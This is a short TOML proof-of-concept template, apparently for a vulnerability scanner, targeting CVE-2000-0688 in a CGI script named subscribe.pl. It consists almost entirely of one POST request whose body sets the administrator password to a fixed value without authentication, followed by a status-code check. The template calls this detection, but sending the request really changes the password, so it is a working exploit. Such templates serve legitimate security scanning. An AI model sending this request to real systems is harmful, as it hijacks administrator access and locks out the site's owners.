[info]
author = "AVE"
description = "通过向 subscribe.pl 发送带有 setpwd 参数的 POST 请求，检测目标是否允许未授权修改管理员密码"
id = "POC-AVE-2000-0538"
name = "CVE-2000-0688 PoC"
severity = "high"
tags = ["cve-2000-0688"]
vuln_id = [
    "CVE-2000-0688",
    "AVE-2000-0538",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/subscribe.pl"
protocol = "http"

[poc.requests.body]
content = "pwd=avepoc123&pwd2=avepoc123&setpwd=Set+Password"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
